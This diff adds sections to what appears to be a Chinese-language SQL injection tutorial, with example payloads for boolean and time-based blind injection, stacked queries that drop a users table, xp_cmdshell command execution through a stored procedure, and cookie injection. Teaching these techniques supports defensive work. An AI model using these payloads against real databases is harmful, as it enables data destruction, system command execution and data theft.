@@ -76,3 +76,67 @@ SELECT username, password FROM users WHERE username = 'admin' AND password = 'ad
 ```
 
 可以通过报错获得数据库版本信息。
+
+## 盲注（布尔注入、时间注入）
+
+### 布尔注入
+
+无法直接获取查询结果，攻击者通过判断返回页面的响应（如布尔值或时间延迟）来逐步推测数据。
+
+输入：
+
+``` sql
+' AND (SELECT 1 WHERE SUBSTRING((SELECT database()), 1, 1)='t') --
+```
+
+`SUBSTRING` 函数用于从字符串中提取子字符串,它接受三个参数：表达式、起始位置和长度，并返回指定部分的字符串。此语句根据返回结果判断数据库名首字母是否为 "t"。
+
+### 时间注入
+
+输入：
+
+``` sql
+' AND IF(1=1, SLEEP(5), 0) --
+```
+
+如果盲注成功，则等待 5 秒。
+
+## 堆叠查询注入
+
+允许多条 SQL 语句同时执行。
+
+输入：
+
+``` sql
+'; DROP TABLE users; --
+```
+
+这将导致 `users` 表被删除。某些数据库（如 MySQL）默认不支持多语句执行。
+
+## 存储过程注入
+
+利用存储过程的输入参数注入恶意 SQL。
+
+输入：
+
+``` sql
+'; EXEC xp_cmdshell('dir'); --
+```
+
+执行的语句：
+
+``` sql
+EXEC LoginProcedure 'username', ''; EXEC xp_cmdshell('dir'); --'
+```
+
+`EXEC` 用于执行动态 SQL 语句。此语句将执行系统命令（如列出目录）。
+
+## Cookie 注入
+
+利用修改浏览器存储的 Cookie 值进行注入。
+
+``` sql
+Cookie: session_id=' OR '1'='1;
+```
+
+服务器在解析 Cookie 时执行了恶意 SQL。
